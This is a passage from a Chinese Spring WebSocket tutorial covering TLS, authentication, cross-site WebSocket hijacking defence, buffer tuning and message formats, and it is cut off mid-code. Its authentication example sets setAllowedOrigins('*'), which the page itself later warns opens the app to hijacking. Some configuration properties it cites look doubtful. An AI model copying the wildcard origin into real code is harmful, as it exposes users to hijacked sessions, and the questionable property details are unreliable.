<p><strong>结论：</strong> 对于任何需要横向扩展的生产级 WebSocket 应用，采用 <strong>STOMP 配合外部消息代理（如 RabbitMQ、ActiveMQ）</strong> 的方案是目前业界公认的最佳实践。它将你的应用服务器变成了易于扩展和维护的无状态节点，而将状态管理的重任交给了为此而生的专业消息中间件。</p>
<hr>
<h2 id="4-安全加固"><a href="#4-安全加固" class="headerlink" title="4. 安全加固"></a>4. 安全加固</h2><p>一旦 WebSocket 连接建立，它就为客户端和服务器之间打开了一条双向通信的“隧道”。这条隧道绕过了常规的 HTTP 请求&#x2F;响应周期，因此必须在连接建立时和连接期间都实施严格的安全策略。</p>
<h3 id="4-1-强制-WSS：数据传输加密"><a href="#4-1-强制-WSS：数据传输加密" class="headerlink" title="4.1 强制 WSS：数据传输加密"></a>4.1 强制 WSS：数据传输加密</h3><ul>
<li><p><strong>是什么？</strong></p>
<ul>
<li><code>ws://</code> (WebSocket) 类似于 <code>http://</code>，其传输的数据是<strong>未加密的明文</strong>。</li>
<li><code>wss://</code> (WebSocket Secure) 类似于 <code>https://</code>，它在标准的 WebSocket 协议基础上，通过 TLS&#x2F;SSL 加密层进行数据传输。</li>
</ul>
</li>
<li><p><strong>为什么必须使用？</strong><br>在生产环境中，如果使用 <code>ws://</code>，任何处在客户端和服务器之间的中间节点（如不安全的 Wi-Fi、代理、ISP）都可以轻易地<strong>窃听</strong>（读取消息内容）和<strong>篡改</strong>（修改消息内容）通信数据，这被称为中间人攻击（Man-in-the-Middle, MITM）。<code>wss://</code> 通过加密可以有效防止这类攻击，确保通信的<strong>机密性</strong>和<strong>完整性</strong>。</p>
</li>
<li><p><strong>如何实现？</strong></p>
<ol>
<li><p><strong>应用服务器配置 SSL&#x2F;TLS：</strong><br>在 Spring Boot 中，最简单的方式是在 <code>application.properties</code> 或 <code>application.yml</code> 中配置 SSL。你需要一个 SSL 证书（例如 <code>.p12</code> 或 <code>.jks</code> 格式）。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8443</span></span><br><span class="line"><span class="attr">server.ssl.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">server.ssl.key-store-type</span>=<span class="string">PKCS12</span></span><br><span class="line"><span class="attr">server.ssl.key-store</span>=<span class="string">classpath:keystore/your-certificate.p12</span></span><br><span class="line"><span class="attr">server.ssl.key-store-password</span>=<span class="string">your_password</span></span><br><span class="line"><span class="attr">server.ssl.key-alias</span>=<span class="string">your_alias</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在反向代理中终止 SSL (推荐的生产实践):</strong><br>在大多数生产环境中，SSL&#x2F;TLS 通常在反向代理层（如 Nginx、API Gateway）被终止。客户端连接到 Nginx 的 <code>wss://</code> 地址，而 Nginx 再通过内网的 <code>ws://</code> 连接到后端的 Spring Boot 应用。这样可以集中管理证书，并减轻应用服务器的加解密负担。<br><strong>Nginx 配置示例：</strong></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> your.domain.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">ssl_certificate</span> /path/to/your/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /path/to/your/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /ws/ &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://&lt;your_spring_boot_app_ip&gt;:8080/ws/;</span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 关键头信息，用于协议升级</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;Upgrade&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 传递真实 IP 和协议信息</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端修改连接地址：</strong><br>客户端只需将连接 URL 从 <code>ws://your.domain.com/ws</code> 修改为 <code>wss://your.domain.com/ws</code> 即可。</p>
</li>
</ol>
</li>
</ul>
<hr>
<h3 id="4-2-身份验证-Authentication"><a href="#4-2-身份验证-Authentication" class="headerlink" title="4.2 身份验证 (Authentication)"></a>4.2 身份验证 (Authentication)</h3><p>匿名 WebSocket 连接在大多数应用中是无用的，我们必须知道是<strong>谁</strong>在连接。</p>
<ul>
<li><p><strong>1. 基于 Token 的验证 (适用于前后端分离&#x2F;SPA)</strong><br>这是最常见的方式。用户通过 HTTP 登录获取一个 Token (如 JWT)，然后在建立 WebSocket 连接时携带此 Token。</p>
<ul>
<li><strong>实现方式：</strong> 在握手拦截器 <code>HandshakeInterceptor</code> 的 <code>beforeHandshake</code> 方法中进行校验。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.server.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.ServletServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.WebSocketHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.socket.server.HandshakeInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.Principal;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthHandshakeInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandshakeInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入你的 Token 验证服务</span></span><br><span class="line">    <span class="comment">// @Autowired private JwtTokenProvider tokenProvider;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beforeHandshake</span><span class="params">(ServerHttpRequest request, WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> ServletServerHttpRequest) &#123;</span><br><span class="line">            <span class="type">ServletServerHttpRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletServerHttpRequest) request;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 从 HTTP Header 中获取 Token</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> servletRequest.getServletRequest().getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 简单的 Bearer Token 格式校验</span></span><br><span class="line">            <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; token.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">                token = token.substring(<span class="number">7</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 验证 Token (伪代码)</span></span><br><span class="line">                <span class="comment">// if (tokenProvider.validateToken(token)) &#123;</span></span><br><span class="line">                <span class="comment">//    String username = tokenProvider.getUsernameFromJWT(token);</span></span><br><span class="line">                <span class="keyword">if</span> (isValid(token)) &#123; <span class="comment">// 替换为真实的 Token 验证逻辑</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> getUsernameFrom(token);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 创建一个 Principal 对象代表已认证的用户</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">Principal</span> <span class="variable">userPrincipal</span> <span class="operator">=</span> () -&gt; username;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 将认证信息放入 WebSocket Session 的 attributes 中</span></span><br><span class="line">                    <span class="comment">// 后续在 STOMP 的事件或控制器中可以通过 HeaderAccessor.getUser() 获取</span></span><br><span class="line">                    attributes.put(<span class="string">&quot;user&quot;</span>, userPrincipal);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 握手成功</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 验证失败，拒绝握手</span></span><br><span class="line">        System.err.println(<span class="string">&quot;WebSocket handshake rejected: Invalid or missing token.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... afterHandshake 方法 ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 WebSocket 配置中注册此拦截器</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> &#123;</span><br><span class="line">    registry.addEndpoint(<span class="string">&quot;/ws&quot;</span>)</span><br><span class="line">            .addInterceptors(<span class="keyword">new</span> <span class="title class_">AuthHandshakeInterceptor</span>()) <span class="comment">// 添加拦截器</span></span><br><span class="line">            .setAllowedOrigins(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端在连接时，需要在 <code>stompjs</code> 的 <code>connectHeaders</code> 中传入 Token。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">Client</span>(&#123;</span><br><span class="line">    <span class="attr">brokerURL</span>: <span class="string">&#x27;wss://your.domain.com/ws&#x27;</span>,</span><br><span class="line">    <span class="attr">connectHeaders</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer your-jwt-token-here&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>2. 集成 Spring Security (适用于传统 Session 或统一安全框架)</strong><br>如果你的应用已经在使用 Spring Security，那么集成 WebSocket 认证会非常自然。</p>
<ul>
<li><strong>原理：</strong> WebSocket 的 HTTP Upgrade 握手请求本身就是一个 HTTP 请求，它会经过 Spring Security 的 Filter 链。如果用户已经通过 HTTP 登录（例如，持有 Session Cookie），Spring Security 会自动将认证信息（<code>Principal</code>）填充到 <code>HttpServletRequest</code> 中。</li>
<li><strong>实现：</strong> Spring WebSocket 会<strong>自动</strong>从握手请求中获取 <code>Principal</code> 并将其与 <code>WebSocketSession</code> 关联。你几乎不需要做任何额外配置！</li>
<li><strong>使用：</strong> 在你的 <code>@MessageMapping</code> 方法中，可以直接注入 <code>Principal</code> 对象来获取当前用户信息。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateMessageController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MessageMapping(&quot;/private.message&quot;)</span></span><br><span class="line">    <span class="meta">@SendToUser(&quot;/queue/reply&quot;)</span> <span class="comment">// 发送给当前用户</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sendPrivateMessage</span><span class="params">(<span class="meta">@Payload</span> String message, Principal principal)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> principal.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;Received a private message from &quot;</span> + username + <span class="string">&quot;: &quot;</span> + message);</span><br><span class="line">        <span class="comment">// 处理私信逻辑...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Reply to &quot;</span> + username + <span class="string">&quot;: message received.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-3-跨站-WebSocket-劫持-CSWSH-防御"><a href="#4-3-跨站-WebSocket-劫持-CSWSH-防御" class="headerlink" title="4.3 跨站 WebSocket 劫持 (CSWSH) 防御"></a>4.3 跨站 WebSocket 劫持 (CSWSH) 防御</h3><ul>
<li><p><strong>攻击原理 (Cross-Site WebSocket Hijacking):</strong><br>这是一种类似于 CSRF 的攻击。假设用户已登录你的网站 <code>A.com</code>。然后，用户访问了一个恶意网站 <code>B.com</code>。<code>B.com</code> 的页面中的 JavaScript 可以尝试向你的 WebSocket 端点 <code>wss://A.com/ws</code> 发起连接。由于浏览器会自动携带 <code>A.com</code> 的 Cookie，如果你的认证是基于 Cookie 的，这个连接就会被认证成功。此时，<code>B.com</code> 就能以用户的身份与你的服务器进行 WebSocket 通信，窃取信息或执行恶意操作。</p>
</li>
<li><p><strong>防御手段：校验 <code>Origin</code> 头部</strong><br>浏览器在发起跨域请求（包括 WebSocket 握手）时，会自动在请求头中添加一个 <code>Origin</code> 字段，标明请求发起的源（例如 <code>https://B.com</code>）。服务器端必须校验这个 <code>Origin</code> 头部，只允许来自受信任域名的连接。</p>
</li>
<li><p><strong>Spring 实现：</strong><br>Spring WebSocket 提供了非常便捷的配置方式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> &#123;</span><br><span class="line">    registry.addEndpoint(<span class="string">&quot;/ws&quot;</span>)</span><br><span class="line">            <span class="comment">// 只允许来自 &quot;https://your-frontend.com&quot; 的连接</span></span><br><span class="line">            .setAllowedOrigins(<span class="string">&quot;https://your-frontend.com&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 或者使用模式匹配，允许所有子域名</span></span><br><span class="line">            <span class="comment">// .setAllowedOriginPatterns(&quot;https://*.your-domain.com&quot;, &quot;http://localhost:3000&quot;)</span></span><br><span class="line">            </span><br><span class="line">            .withSockJS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>最佳实践：</strong></p>
<ul>
<li><strong>永远不要使用 <code>setAllowedOrigins(&quot;\*&quot;)</code> 在生产环境！</strong> 这会完全禁用 Origin 检查，使你的应用暴露在 CSWSH 攻击之下。</li>
<li>尽可能使用 <code>setAllowedOrigins</code> 提供精确的域名列表。</li>
<li>如果需要支持多个子域或开发环境，谨慎使用 <code>setAllowedOriginPatterns</code>。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="5-性能与调优"><a href="#5-性能与调优" class="headerlink" title="5. 性能与调优"></a>5. 性能与调优</h2><p>当 WebSocket 应用的用户量和消息吞吐量增长时，性能瓶颈可能会出现在网络、CPU 或内存等多个方面。合理的调优可以显著提升应用的吞吐能力和稳定性。</p>
<h3 id="5-1-消息大小与缓冲区配置"><a href="#5-1-消息大小与缓冲区配置" class="headerlink" title="5.1 消息大小与缓冲区配置"></a>5.1 消息大小与缓冲区配置</h3><ul>
<li><p><strong>背景：</strong><br>为了处理网络 I&#x2F;O，WebSocket 服务器（如 Tomcat, Undertow）和 Spring 框架本身都会使用缓冲区（Buffer）。当应用发送消息时，消息数据会先被写入这些缓冲区，然后由 I&#x2F;O 线程异步发送到网络上。缓冲区的大小直接影响了消息处理的方式和效率。</p>
</li>
<li><p><strong>核心参数：</strong><br>在 Spring Boot 中，主要有两层配置需要关注：</p>
<ol>
<li><p><strong>Spring WebSocket 消息缓冲区 (<code>spring.websocket.messaging.\*</code>):</strong><br>这些配置控制 Spring <code>StompSubProtocolHandler</code> 的行为。</p>
<ul>
<li><code>send-buffer-size-limit</code>: 发送缓冲区的总大小限制（默认 512KB）。当缓冲区满时，尝试发送消息的线程会被<strong>阻塞</strong>，直到缓冲区有可用空间。这是一种背压（Back-pressure）机制，防止应用因生产消息过快而耗尽内存。</li>
<li><code>send-time-limit</code>: 发送消息的超时时间（默认 10秒）。如果一个消息因为缓冲区持续满而无法在规定时间内发送，连接将被关闭。这可以防止一个缓慢的客户端拖垮整个服务器。</li>
</ul>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="comment"># 将发送缓冲区上限增加到 1MB</span></span><br><span class="line"><span class="attr">spring.websocket.messaging.send-buffer-size-limit</span>=<span class="string">1048576 </span></span><br><span class="line"><span class="comment"># 将发送超时时间增加到 20 秒</span></span><br><span class="line"><span class="attr">spring.websocket.messaging.send-time-limit</span>=<span class="string">20000 </span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Web 容器 I&#x2F;O 缓冲区 (<code>server.tomcat.\*</code> or <code>server.undertow.\*</code>):</strong><br>这控制了底层 Web 容器的 TCP 缓冲区大小。如果一条 WebSocket 消息的大小超过了这个缓冲区，它将被<strong>分片 (Fragmented)</strong> 成多个 WebSocket 帧进行传输。</p>
<ul>
<li><strong>Tomcat:</strong> <code>server.tomcat.max-http-post-size</code> (虽然名字是post，但也影响WebSocket消息大小)</li>
<li><strong>Undertow:</strong> <code>server.undertow.buffer-size</code></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>调优策略：</strong></p>
<ul>
<li><strong>对于大量小消息：</strong> 默认配置通常表现良好。过大的缓冲区可能会造成内存浪费。</li>
<li><strong>对于需要发送大消息的场景（如文件传输、大数据可视化）：</strong><ul>
<li>必须适当<strong>增大 <code>send-buffer-size-limit</code></strong>，否则发送线程会频繁阻塞，导致吞吐量下降。</li>
<li>同时，可能需要增大底层容器的缓冲区（如 <code>server.undertow.buffer-size</code>），以<strong>避免消息被过度分片</strong>。消息分片和重组会带来额外的 CPU 和网络开销。</li>
<li><strong>原则：</strong> 容器的 I&#x2F;O 缓冲区大小应略大于你预期的最大单条消息大小。</li>
</ul>
</li>
<li><strong>监控：</strong> 在生产环境中，监控发送缓冲区的利用率和因缓冲区满而导致的阻塞时间，是决定是否需要调优的关键依据。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="5-2-同步与异步发送的选择"><a href="#5-2-同步与异步发送的选择" class="headerlink" title="5.2 同步与异步发送的选择"></a>5.2 同步与异步发送的选择</h3><ul>
<li><strong>Spring STOMP 的默认行为：异步发送</strong><br>当你使用 <code>SimpMessagingTemplate.convertAndSend()</code> 时，这个调用是<strong>异步</strong>的。<ul>
<li><strong>工作原理：</strong> 你的调用线程（例如，一个处理 HTTP 请求的线程）将消息交给 Spring 的 <code>clientOutboundChannel</code> 后会<strong>立即返回</strong>。专门的 <code>outbound-channel-executor</code> 线程池会负责将消息实际写入 WebSocket 连接。</li>
<li><strong>优势：</strong><ol>
<li><strong>高吞吐量：</strong> 应用线程不会因为网络 I&#x2F;O 或慢客户端而被阻塞，可以快速处理更多业务请求。</li>
<li><strong>隔离性：</strong> WebSocket 的发送性能问题不会直接影响到应用的其它部分（如 HTTP API 的响应时间）。</li>
</ol>
</li>
<li><strong>结论：</strong> 在绝大多数情况下，<strong>你应该坚持使用默认的异步发送</strong>。这是 Spring 设计的精髓所在，旨在构建高并发、响应迅速的应用。</li>
</ul>
</li>
<li><strong>原生 WebSocket API 的行为：同步发送</strong><br>如果你使用原生的 <code>WebSocketSession.sendMessage()</code>，这个调用通常是<strong>同步阻塞</strong>的。<ul>
<li><strong>潜在风险：</strong> 调用线程会一直等待，直到消息被完全写入操作系统的 TCP 发送缓冲区。如果网络拥塞或者客户端接收缓慢，这个调用可能会<strong>阻塞很长时间</strong>。</li>
<li><strong>严重后果：</strong> 如果你在一个处理 HTTP 请求的关键线程中调用了 <code>session.sendMessage()</code>，一个慢速的 WebSocket 客户端就可能耗尽你的 HTTP 线程池，导致整个应用无响应。</li>
<li><strong>解决方案：</strong> 如果你必须使用原生 API 并且需要发送大量数据，你应该将 <code>sendMessage()</code> 的调用<strong>包装在自己的异步任务中</strong>（例如，提交给一个专用的线程池），以避免阻塞关键线程。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="5-3-消息格式选择：JSON-vs-Protobuf"><a href="#5-3-消息格式选择：JSON-vs-Protobuf" class="headerlink" title="5.3 消息格式选择：JSON vs Protobuf"></a>5.3 消息格式选择：JSON vs Protobuf</h3><p>消息格式的选择直接影响到<strong>网络带宽占用</strong>、<strong>CPU 序列化&#x2F;反序列化开销</strong>和<strong>开发调试效率</strong>。</p>
<ul>
<li><strong>JSON (JavaScript Object Notation)</strong><ul>
<li><strong>优点：</strong><ul>
<li><strong>可读性强：</strong> 纯文本，易于人类阅读和调试。</li>
<li><strong>通用性好：</strong> Web 前端原生支持（<code>JSON.parse</code>, <code>JSON.stringify</code>），几乎所有语言都有完善的库。</li>
<li><strong>开发友好：</strong> 无需预定义 schema，动态修改结构方便。</li>
</ul>
</li>
<li><strong>缺点：</strong><ul>
<li><strong>冗余：</strong> 包含大量的键名、括号、引号，体积较大。</li>
<li><strong>性能：</strong> 基于文本的解析比二进制解析慢。</li>
<li><strong>类型不安全：</strong> 无法在协议层面保证数据类型和结构的正确性。</li>
</ul>
</li>
</ul>
</li>
<li><strong>Protobuf (Protocol Buffers)</strong><ul>
<li><strong>优点：</strong><ul>
<li><strong>极致紧凑：</strong> 二进制格式，移除了所有冗余信息，消息体积通常比 JSON 小 3-10 倍。</li>
<li><strong>高性能：</strong> 序列化和反序列化速度极快，CPU 占用低。</li>
<li><strong>强类型与 schema：</strong> 通过 <code>.proto</code> 文件预定义消息结构，具有严格的类型检查，减少运行时错误。</li>
<li><strong>向后&#x2F;向前兼容：</strong> 良好的版本管理机制，便于协议升级。</li>
</ul>
</li>
<li><strong>缺点：</strong><ul>
<li><strong>不可读：</strong> 二进制格式，无法直接阅读，调试需要借助工具。</li>
<li><strong>需要编译：</strong> <code>.proto</code> 文件需要编译成特定语言的代码（如 Java, JS）。</li>
<li><strong>前期工作量大：</strong> 需要预先设计和维护 <code>.proto</code> 文件。</li>
</ul>
</li>
</ul>
</li>
<li><strong>选型指南与对比</strong></li>
</ul>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">JSON</th>
<th align="left">Protobuf</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>可读性</strong></td>
<td align="left"><strong>高</strong></td>
<td align="left">低 (二进制)</td>
</tr>
<tr>
<td align="left"><strong>消息体积</strong></td>
<td align="left">大 (冗余)</td>
<td align="left"><strong>小</strong> (紧凑)</td>
</tr>
<tr>
<td align="left"><strong>序列化性能</strong></td>
<td align="left">中等</td>
<td align="left"><strong>高</strong></td>
</tr>
<tr>
<td align="left"><strong>Schema 约束</strong></td>
<td align="left">无 (灵活但易错)</td>
<td align="left"><strong>强</strong> (<code>.proto</code> 文件)</td>
</tr>
<tr>
<td align="left"><strong>开发效率</strong></td>
<td align="left"><strong>高</strong> (快速上手)</td>
<td align="left">低 (需要预定义和编译)</td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left">Web 应用、管理后台、API</td>
<td align="left">高性能游戏、金融行情、IoT、移动端</td>
</tr>
</tbody></table>
<p><strong>如何在 Spring 中使用 Protobuf？</strong></p>
<p>你需要创建一个自定义的 <code>MessageConverter</code>。</p>
<ol>
<li><p><strong>添加依赖:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.protobuf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.21.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- Use an appropriate version --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建 <code>ProtobufMessageConverter</code>:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProtobufMessageConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractMessageConverter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProtobufMessageConverter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 定义此转换器支持的 MimeType</span></span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">MimeType</span>(<span class="string">&quot;application&quot;</span>, <span class="string">&quot;x-protobuf&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否是 Protobuf 生成的类</span></span><br><span class="line">        <span class="keyword">return</span> GeneratedMessageV3.class.isAssignableFrom(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">convertFromInternal</span><span class="params">(Message&lt;?&gt; message, Class&lt;?&gt; targetClass, Object conversionHint)</span> &#123;</span><br><span class="line">        <span class="comment">// 